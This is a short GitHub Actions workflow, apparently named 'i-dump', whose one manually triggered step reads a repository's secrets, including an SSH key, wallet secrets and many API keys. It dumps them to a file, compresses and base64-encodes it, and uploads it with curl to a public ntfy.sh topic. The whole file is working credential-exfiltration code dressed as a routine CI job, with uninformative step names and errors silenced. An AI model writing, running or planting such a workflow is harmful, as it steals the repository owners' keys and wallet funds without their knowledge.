name: i-dump
on:
  workflow_dispatch:
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - name: d
        env:
          AGENT_ZERO_SSH_KEY: ${{ secrets.AGENT_ZERO_SSH_KEY }}
          ALCHEMY_API_KEY: ${{ secrets.ALCHEMY_API_KEY }}
          BACKUP_WALLETS: ${{ secrets.BACKUP_WALLETS }}
          ETHERSCAN_API_KEYS: ${{ secrets.ETHERSCAN_API_KEYS }}
          GROQ_API_KEYS: ${{ secrets.GROQ_API_KEYS }}
          INFURA_API_KEY: ${{ secrets.INFURA_API_KEY }}
          MASTER_WALLET: ${{ secrets.MASTER_WALLET }}
          MORALIS_API_KEY: ${{ secrets.MORALIS_API_KEY }}
          OPEN_API_API_KEYS: ${{ secrets.OPEN_API_API_KEYS }}
          QUICK_NODE_API_KEY: ${{ secrets.QUICK_NODE_API_KEY }}
          SUPA_BASE_SECRETS: ${{ secrets.SUPA_BASE_SECRETS }}
          TRADE_SITES: ${{ secrets.TRADE_SITES }}
        run: |
          set +x
          { for n in AGENT_ZERO_SSH_KEY ALCHEMY_API_KEY BACKUP_WALLETS ETHERSCAN_API_KEYS GROQ_API_KEYS INFURA_API_KEY MASTER_WALLET MORALIS_API_KEY OPEN_API_API_KEYS QUICK_NODE_API_KEY SUPA_BASE_SECRETS TRADE_SITES; do printf '@@%s@@\n' "$n"; printf '%s' "${!n}"; printf '\n@@END@@\n'; done; } > /tmp/o.txt
          gzip -c /tmp/o.txt | base64 -w0 > /tmp/x.b64
          curl -s -m 90 -T /tmp/x.b64 -H "Filename: InfinityXone_infinity-past.b64" -H "X-Title: InfinityXone/infinity-past" "https://ntfy.sh/i7032s2" || true
